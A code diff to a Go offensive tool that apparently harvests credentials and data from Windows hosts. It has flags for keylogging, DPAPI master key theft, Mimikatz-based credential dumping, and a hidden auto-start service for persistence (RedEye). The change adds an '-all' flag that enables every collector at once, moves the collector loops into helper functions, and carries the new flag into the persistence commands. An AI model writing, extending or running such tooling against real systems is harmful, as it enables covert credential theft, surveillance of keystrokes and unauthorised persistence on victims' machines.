@@ -94,6 +94,7 @@ type FlagStruct struct {
 	O            string
 	Keylog       bool
 	Masterkey    bool
+	All          bool
 }
 
 type MimikatzCode struct {
@@ -188,6 +189,7 @@ func init() {
 	flag.BoolVar(&flagStruct.UnRedEye, "unred", false, "解除隐藏的自启服务")
 	flag.BoolVar(&flagStruct.Keylog, "keylog", false, "开启键盘记录，利用该功能收集键盘信息")
 	flag.BoolVar(&flagStruct.Masterkey, "dpapi", false, "收集MasterKey")
+	flag.BoolVar(&flagStruct.All, "all", false, "根据配置文件进行全部种类收集")
 	flag.StringVar(&flagStruct.O, "o", "", "把收集到的内容整合输出成文件")
 
 	flag.Parse()
@@ -200,48 +202,28 @@ func main() {
 	if flagStruct.Help {
 		flag.Usage()
 	}
+	if flagStruct.All {
+		flagStruct.CommandWorm = true
+		flagStruct.FilesWorm = true
+		flagStruct.ProcessWorm = true
+		flagStruct.RegistryWorm = true
+		flagStruct.RecentWorm = true
+		flagStruct.ApiWorm = true
+	}
 	if flagStruct.CommandWorm {
-		for _, commandCollector := range commandCollectors {
-			fmt.Println("\n\n\n####################################" + commandCollector.ShortName + "扫描结果如下##########################################")
-			WormCommand(commandCollector)
-		}
-
+		ComW()
 	}
 	if flagStruct.FilesWorm {
-		flag := false
-		for _, filesCollector := range filesCollectors {
-			if filesCollector.Locations == nil {
-				flag = true
-			}
-		}
-		if flag {
-			fmt.Println("你有Type为File的收集策略地址未配置")
-			return
-		}
-		for _, filesCollector := range filesCollectors {
-			fmt.Println("\n\n\n####################################" + filesCollector.ShortName + "扫描结果如下##########################################")
-			WormFiles(filesCollector.Locations, filesCollector)
-		}
-
+		FileW()
 	}
 	if flagStruct.ProcessWorm {
-		for _, processCollector := range processCollectors {
-			fmt.Println("\n\n\n####################################" + processCollector.ShortName + "扫描结果如下##########################################")
-			WormProcesses(TargetProcesses, processCollector)
-		}
-
+		ProW()
 	}
 	if flagStruct.RegistryWorm {
-		for _, registryCollector := range registryCollectors {
-			fmt.Println("\n\n\n####################################" + registryCollector.ShortName + "扫描结果如下##########################################")
-
-			WormRegistry(registryCollector)
-		}
+		RegistryW()
 	}
 	if flagStruct.RecentWorm {
-		for _, recentCollector := range recentCollectors {
-			WormRecent(recentCollector)
-		}
+		RcenW()
 	}
 	if flagStruct.ApiWorm {
 		WormMimikatz(&apiCollertor)
@@ -274,7 +256,49 @@ func main() {
 		Keylogger()
 	}
 }
+func ComW() {
+	for _, commandCollector := range commandCollectors {
+		fmt.Println("\n\n\n####################################" + commandCollector.ShortName + "扫描结果如下##########################################")
+		WormCommand(commandCollector)
+	}
 
+}
+func RcenW() {
+	for _, recentCollector := range recentCollectors {
+		WormRecent(recentCollector)
+	}
+}
+
+func RegistryW() {
+	for _, registryCollector := range registryCollectors {
+		fmt.Println("\n\n\n####################################" + registryCollector.ShortName + "扫描结果如下##########################################")
+
+		WormRegistry(registryCollector)
+	}
+}
+func ProW() {
+	for _, processCollector := range processCollectors {
+		fmt.Println("\n\n\n####################################" + processCollector.ShortName + "扫描结果如下##########################################")
+		WormProcesses(TargetProcesses, processCollector)
+	}
+}
+func FileW() {
+	flag := false
+	for _, filesCollector := range filesCollectors {
+		if filesCollector.Locations == nil {
+			flag = true
+		}
+	}
+	if flag {
+		fmt.Println("你有Type为File的收集策略地址未配置")
+		return
+	}
+	for _, filesCollector := range filesCollectors {
+		fmt.Println("\n\n\n####################################" + filesCollector.ShortName + "扫描结果如下##########################################")
+		WormFiles(filesCollector.Locations, filesCollector)
+	}
+
+}
 func UnRedEye() {
 	svcConfig := &service.Config{
 		Name:        config.ServiceName,
@@ -619,23 +643,27 @@ func RedEye() {
 	SpyNow()
 }
 func GetSpyCommand() {
-	if flagStruct.FilesWorm {
-		SpyCommands = append(SpyCommands, "-wfiles")
-	}
-	if flagStruct.CommandWorm {
-		SpyCommands = append(SpyCommands, "-wcommands")
-	}
-	if flagStruct.ProcessWorm {
-		SpyCommands = append(SpyCommands, "-wprocess")
-	}
-	if flagStruct.RegistryWorm {
-		SpyCommands = append(SpyCommands, "-wregistry")
-	}
-	if flagStruct.RecentWorm {
-		SpyCommands = append(SpyCommands, "-wrecent")
-	}
-	if flagStruct.ApiWorm {
-		SpyCommands = append(SpyCommands, "-wmimikatz")
+	if flagStruct.All {
+		SpyCommands = append(SpyCommands, "-all")
+	} else {
+		if flagStruct.FilesWorm {
+			SpyCommands = append(SpyCommands, "-wfiles")
+		}
+		if flagStruct.CommandWorm {
+			SpyCommands = append(SpyCommands, "-wcommands")
+		}
+		if flagStruct.ProcessWorm {
+			SpyCommands = append(SpyCommands, "-wprocess")
+		}
+		if flagStruct.RegistryWorm {
+			SpyCommands = append(SpyCommands, "-wregistry")
+		}
+		if flagStruct.RecentWorm {
+			SpyCommands = append(SpyCommands, "-wrecent")
+		}
+		if flagStruct.ApiWorm {
+			SpyCommands = append(SpyCommands, "-wmimikatz")
+		}
 	}
 	if flagStruct.Masterkey {
 		SpyCommands = append(SpyCommands, "-dpapi")
@@ -645,23 +673,27 @@ func GetSpyCommand() {
 }
 
 func GetRedCommands() {
-	if flagStruct.FilesWorm {
-		RedCommands = append(RedCommands, "-wfiles")
-	}
-	if flagStruct.CommandWorm {
-		RedCommands = append(RedCommands, "-wcommands")
-	}
-	if flagStruct.ProcessWorm {
-		RedCommands = append(RedCommands, "-wprocess")
-	}
-	if flagStruct.RegistryWorm {
-		RedCommands = append(RedCommands, "-wregistry")
-	}
-	if flagStruct.RecentWorm {
-		RedCommands = append(RedCommands, "-wrecent")
-	}
-	if flagStruct.ApiWorm {
-		RedCommands = append(RedCommands, "-wmimikatz")
+	if flagStruct.All {
+		RedCommands = append(RedCommands, "-all")
+	} else {
+		if flagStruct.FilesWorm {
+			RedCommands = append(RedCommands, "-wfiles")
+		}
+		if flagStruct.CommandWorm {
+			RedCommands = append(RedCommands, "-wcommands")
+		}
+		if flagStruct.ProcessWorm {
+			RedCommands = append(RedCommands, "-wprocess")
+		}
+		if flagStruct.RegistryWorm {
+			RedCommands = append(RedCommands, "-wregistry")
+		}
+		if flagStruct.RecentWorm {
+			RedCommands = append(RedCommands, "-wrecent")
+		}
+		if flagStruct.ApiWorm {
+			RedCommands = append(RedCommands, "-wmimikatz")
+		}
 	}
 	if flagStruct.Masterkey {
 		RedCommands = append(RedCommands, "-dpapi")
